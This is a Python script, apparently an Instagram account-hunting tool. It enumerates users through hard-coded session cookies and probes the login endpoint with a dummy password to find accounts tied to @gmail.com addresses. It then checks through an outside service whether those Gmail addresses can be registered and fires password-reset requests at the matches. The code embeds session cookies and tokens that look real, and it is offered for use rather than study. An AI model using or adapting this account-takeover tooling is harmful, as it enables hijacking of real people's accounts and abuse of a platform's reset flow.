import requests 
import random
import json
from user_agent import generate_user_agent
import os
import sys
import time

class ZaidKarem:
    def __init__(self):
        self.a = 0
        self.b = 0
        self.i = 0 
        self.x = 0
        self.y = 0
        self.k = 0
        self.q = 0
        self.g = 0
        self.listnumber ='123456'
        self.ro = str(''.join(random.choice(self.listnumber)for i in range(1)))
        self.wh = True 
        print(self.ro)
        self.choice()

    def choice(self):
        os.system("clear")
        self.list1 = f'\033[1;3{self.ro}m\n[1] - Checker Gmail\n[2] - List Users\n[!] - The Hit saved in File Name (GmailTrue.txt)\n[=] - PY : @BBMZZ - @Zaidkarrem\n[!] - Version Tool 0.1\n\n'
        print(self.list1)
        self.choicel()
    def choicel(self):
        self.inp = input("[=] - Enter Your Choice : ")
        self.iff()
    def iff(self):
        if self.inp =="1":
            os.system('clear')
            self.gmail1()
        elif self.inp=="2":
            os.system('clear')
            self.userss()
        else:
            os.system('clear')
            self.err ="Error Choice in Tool"
            sys.exit()
    def userss(self):
        self.list2 ="[1] - username 2010\n[2] - username 2011\n[3] - username 2012\n[4] - username 2013\n\n[!] - Saved Username Name File 2010.txt\n[!] - Telegram : @BBMZZ\n\n"
        print(self.list2)
        self.users3()
    def users3(self):
        try:

            self.inp1 = int(input('[=] - Enter Your Number 1 or 2 or 3 or 4 : '))
            if self.inp1 =='1':
                os.system('clear')
                self.number2 =6
                self.users1()
            elif self.inp =='2':
                os.system('clear')
                self.number2 = 7
                self.users1()
            elif self.inp =='3':
                os.system('clear')
                self.number2= 8
                self.users1()
            elif self.inp =='4':
                os.system('clear')
                self.number2= 9
                self.users1()

        except ValueError as error:
            os.system('clear')
            self.eror = "choice Number ..."
            print(self.eror)
            sys.exit()
        

    def users1(self):
        while self.wh:
            
            self.number = str(''.join(random.choice(self.listnumber)for i in range(self.number2)))
            
            
            url = f'http://i.instagram.com/api/v1/users/{self.number}/info/'
            headers = {
            'Host': 'i.instagram.com',
            "Cookie":f"mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid=iquuw88sji9d",
            'Connection': 'Keep-Alive',
            'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; en_IQ)',
            'Accept-Language': 'en-IQ, en-US',
            'X-IG-Connection-Type': 'MOBILE(LTE)',
            'X-IG-Capabilities': 'AQ==',
            'Accept-Encoding': 'gzip',
            }
            try:

                rr = requests.get(url,headers=headers).text
            except requests.exceptions.ConnectionError as error:
                continue
            try:
                if 'User not found' in rr:
                    self.iderr = "Tihe ID Error"
                    continue
                else:
                    self.rspo=json.loads(rr)
                    self.user = self.rspo['user']['username']
                    with open('2010.txt','a') as self.izz :
                        self.izz.write(f'{self.user}\n')
                    print(self.user)

            except KeyError as error:
                os.system('clear')
                self.vp = "vpn using tool in users"
                print(self.vp)
                break
    def gmail1(self):
        self.inpf = input("[=] - Enter Your File Name : ")
        try:
            self.re = open(self.inpf,"r").read().splitlines()
            self.gmail()

        except FileNotFoundError as error:
            self.erf = "The Name File No in Phone "
            os.system('clear')
            sys.exit()
    def gmail(self):
        for self.email in self.re:
            if ('@') in self.email:
                self.email = self.email.split("@")[0]
            else:
                self.email = self.email
            url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'

            head1 = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '291',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=iMd8tAhvwezltsWZAVi1adkaSyB7EUzO; ds_user_id=58173081681; shbid="12243\05458173081681\0541711782047:01f709696fd88f95ae617bb02b5b6d15a9e8996d88f9e2d3ee8855533aedb9f4987abd92"; shbts="1680246047\05458173081681\0541711782047:01f7d73e9f512a0f35a524df1d0f51b48fcb0023309d321cfb9c3f54c755152397f7da58"; fbsr_124024574287414=LLfGuxN7PwilAJQ2w2bGqQmOX6p3T2JreIplqK1mKOo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRFRUem5mcW1BRUJDbGZHcjJSWWV5UERTd3RhSEJTM2lsTERTaUdXZF9fTHdCaFp2VV9ndVltWEJINE9DenUxamJCbWh3TWtSVmdUOXRyWDVWTHlpcGFFY01fMFlSb3pHOVRibWE0NkRMMm9GTE9FWmJhdzhSNF84c2hDZl9FZGtwb2V4MmtSYTIzNm8xa3A2LWFzZGNRVVk4eVFSU3NwQzlhaEI4NFBYWk1FMVA4aUt5aEIzWGlXOGxjaGJ0Y1R2WEdsUnRBNl91MnlCNExxN09PRjdXZG1DT2p6c2lBM3BsZEY4X2FjX181OGpTUDBTSC1DS0dQMHZYYldlaVBDSWs2ell4SGtkRmNTVkdIUE5sTDB3aUk4azBNcVdSbl9nbXk5RWptV282dmRBQlpVTTVabmJwYXFOT2dLem9ndzRDU2x4WUI3clQtUzdjaWJUbGNqWTlZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUVsVmlXS2JhMkJlRTEwSlBoS01iNVVsdFlhYUlKY05zZVdZWkFodFpCWkNUcElmOTZrNk9nTE9mTnZ1RjdMcUs5WkMyUk1NUWxCQXJPNzVuWkE3U3JLcEtLR3JsRDFEMU5QOWZ5MkxNZkQzeHNINGpMeG9tQUtoRGRnUW1Ea2dzNk10TFNVSEVQbVJFWkFXZkJ5Y1pDbGZmTmp5eGR5U1Jtb3JyN1N2SXN4Y3g2OTdxSVZSSXNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgwNTQwMzI3fQ',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
            
                    'user-agent': '{}'.format(generate_user_agent()),
                    'x-csrftoken': 'iMd8tAhvwezltsWZAVi1adkaSyB7EUzO',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '1007230059',
                    'x-requested-with': 'XMLHttpRequest'
            }
            tim = str(time.time()).split('.')[0]
            data = {
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:wjdjwdjwjdwjdjwdj1212',
                'username': f'{self.email}@gmail.com',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }
            try:
                try:
                    
                    rf = requests.post(url,headers=head1,data=data).text
                except requests.exceptions.ReadTimeout as error:
                    continue
                
            except requests.exceptions.ConnectionError as error:
                continue
          
            if ('"Sorry, your password was incorrect. Please double-check your password."') in rf:
                os.system('clear')
                self.i +=1
                print(f'[$] - Gmail : {self.a}\n[$] - Bad Gmail : {self.x}\n[$] - Bad Instagram : {self.i}\n[$] - Telegram : @BBMZZ')
            elif ('"Sorry, there was a problem with your request.') in rf:
                os.system('clear')
                self.i+=1
                print(f'[$] - Gmail : {self.a}\n[$] - Bad Gmail : {self.x}\n[$] - Bad Instagram : {self.i}\n[$] - Telegram : @BBMZZ')
            elif ('"user":true,') in rf:
                self.url2 =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api1/gmail/{self.email}/').text
             
                if ('"status":"Ok"') in self.url2:
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.email)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        fol = ge['data']['user']['edge_followed_by']['count']
                        bio = ge['data']['user']['biography']
                        fols = ge['data']['user']['edge_follow']['count']
                        id = ge['data']['user']['id']
                        img = ge['data']['user']['profile_pic_url']
                        nam = ge['data']['user']['full_name']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                        ree = rl.json()
                        da = ree['date']
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                with open('GmailTrue.txt','a',encoding="utf-8") as f0:
                                    f0.write(f'\nData : {da}\nRest : {rs}\nEmail : {self.email}@gmail.com\ntelegram : https://t.me/bbmzz\n\n')
                                time.sleep(2)
                            except KeyError as error:
                                print('error')
                                with open('GmailTrue.txt','a') as f8:
                                    f8.write(f'{self.email}@gmail.com\n')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    os.system('clear')
                    self.a+=1
                    print(f'[$] - Gmail : {self.a}\n[$] - Bad Gmail : {self.x}\n[$] - Bad Instagram : {self.i}\n[$] - Telegram : @BBMZZ')
                else:
                    os.system('clear')
                    self.x +=1
                    print(f'[$] - Gmail : {self.a}\n[$] - Bad Gmail : {self.x}\n[$] - Bad Instagram : {self.i}\n[$] - Telegram : @BBMZZ')
        print('done file')
                    


    
ZaidKarem()
